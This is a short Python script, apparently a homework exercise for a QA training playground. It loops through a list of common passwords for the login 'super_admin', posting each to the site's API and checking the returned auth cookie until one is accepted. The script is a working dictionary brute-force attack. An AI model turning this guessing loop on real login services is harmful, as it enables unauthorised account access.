import requests

login = "super_admin"
password = {"!@#$%^&*", "000000", "111111", "121212", "123123", "1234", "12345", "123456", "1234567", "12345678", "123456789", "1234567890", "123qwe", "1q2w3e4r", "1qaz2wsx", "555555", "654321", "666666", "696969", "7777777", "888888", "aa123456", "abc123", "access", "admin", "adobe123", "ashley", "azerty", "bailey", "baseball", "batman", "charlie", "donald", "dragon", "flower", "Football", "football", "freedom", "hello", "hottie", "iloveyou", "jesus", "letmein", "login", "lovely", "loveme", "master", "michael", "monkey", "mustang", "ninja", "passw0rd", "password", "password1", "photoshop", "princess", "qazwsx", "qwerty", "qwerty123", "qwertyuiop", "shadow", "solo", "starwars", "sunshine", "superman", "trustno1", "welcome", "whatever", "zaq1zaq1"}

for p in password:
    data = {"login": login, "password": p}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=data)
    cookie = response1.cookies.get("auth_cookie")
    cookies = {"auth_cookie": cookie}
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text != "You are NOT authorized":
        print(p)
        print(response2.text)
        break

